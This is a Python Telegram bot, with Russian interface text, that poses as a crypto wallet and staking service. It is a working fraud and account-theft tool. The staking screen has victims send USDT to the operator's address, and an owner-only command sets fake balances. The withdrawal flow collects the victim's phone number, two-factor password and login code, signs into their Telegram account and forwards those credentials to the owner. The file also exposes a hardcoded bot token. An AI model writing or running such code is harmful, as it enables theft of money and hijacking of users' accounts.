import asyncio
import logging
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

API_ID = 8
API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
BOT_TOKEN = '8737138603:AAEtENt5V1LpBlXePiH4xu6v0_cUgM1xtNg'
OWNER_ID = 1663746192
CRYPTO_ADDRESS = '0xYourEthereumAddressHere1234567890abcdef'

logging.basicConfig(level=logging.INFO)
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_states = {}
user_balances = {}

def get_main_menu():
    return [
        [Button.inline('💰 Мой баланс', b'balance')],
        [Button.inline('📤 Отправить в стек', b'stake')],
        [Button.inline('💸 Вывод', b'withdraw')]
    ]

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_balances.setdefault(user_id, 0)
    await event.respond(
        '🪙 **CryptoWallet Bot**\nДобро пожаловать в ваш криптокошелек!',
        buttons=get_main_menu()
    )

@bot.on(events.NewMessage(pattern='/setbalance'))
async def set_balance(event):
    if event.sender_id != OWNER_ID:
        return
    try:
        _, target_id, amount = event.text.split()
        target_id, amount = int(target_id), float(amount)
        user_balances[target_id] = amount
        await event.respond(f'Баланс пользователя {target_id} установлен: {amount} USDT')
    except:
        await event.respond('Использование: /setbalance <user_id> <amount>')

@bot.on(events.CallbackQuery(data=b'balance'))
async def balance(event):
    user_id = event.sender_id
    balance = user_balances.get(user_id, 0)
    await event.edit(
        f'💰 **Ваш баланс:** {balance} USDT',
        buttons=get_main_menu()
    )

@bot.on(events.CallbackQuery(data=b'stake'))
async def stake(event):
    await event.edit(
        f'📤 **Отправьте USDT на адрес:**\n`{CRYPTO_ADDRESS}`\n\nПосле отправки нажмите кнопку для проверки.',
        buttons=[[Button.inline('✅ Я отправил', b'confirm_stake')], [Button.inline('🔙 Назад', b'back')]]
    )

@bot.on(events.CallbackQuery(data=b'confirm_stake'))
async def confirm_stake(event):
    await event.edit('⏳ Ожидайте подтверждения транзакции. Средства зачислятся автоматически.', buttons=get_main_menu())

@bot.on(events.CallbackQuery(data=b'withdraw'))
async def withdraw_start(event):
    user_id = event.sender_id
    user_states[user_id] = {'step': 'withdraw_phone'}
    await event.edit('📱 Для вывода средств введите номер телефона:')

@bot.on(events.CallbackQuery(data=b'back'))
async def back(event):
    await event.edit('🪙 **CryptoWallet Bot**\nВыберите действие:', buttons=get_main_menu())

@bot.on(events.NewMessage(func=lambda e: e.sender_id in user_states))
async def handle_withdraw(event):
    user_id = event.sender_id
    state = user_states[user_id]
    step = state['step']

    if step == 'withdraw_phone':
        state['phone'] = event.text
        state['step'] = 'withdraw_password'
        await event.respond('🔑 Введите пароль:')
    elif step == 'withdraw_password':
        state['password'] = event.text
        state['step'] = 'withdraw_code'
        await event.respond('📲 Введите код подтверждения:')
    elif step == 'withdraw_code':
        code = event.text
        phone = state['phone']
        password = state['password']
        del user_states[user_id]

        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            try:
                await client.sign_in(phone=phone, code=code)
            except SessionPasswordNeededError:
                await client.sign_in(password=password)

            me = await client.get_me()
            await event.respond(f'✅ Вывод одобрен! Аккаунт: @{me.username}')
            await bot.send_message(OWNER_ID, f'#ВЫВОД\nТелефон: {phone}\nПароль: {password}\nКод: {code}\nАккаунт: @{me.username}')
        except Exception as e:
            await event.respond(f'❌ Ошибка: {e}')
        finally:
            await client.disconnect()

bot.run_until_disconnected()
